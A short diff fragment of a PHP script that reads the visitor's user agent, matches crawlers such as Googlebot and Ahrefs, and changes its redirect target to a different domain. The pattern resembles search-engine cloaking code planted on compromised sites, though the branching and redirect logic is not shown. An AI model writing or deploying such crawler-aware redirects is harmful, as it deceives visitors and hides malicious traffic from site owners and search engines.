@@ -5,7 +5,7 @@
 
     $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
 
-    $urlTo = "https://www.adesso.com";
+    $urlTo = "https://hpcet2025.vocsafe.com";
 
     $botchar = "/(googlebot|slurp|adsense|inspection|ahrefs)/";
 
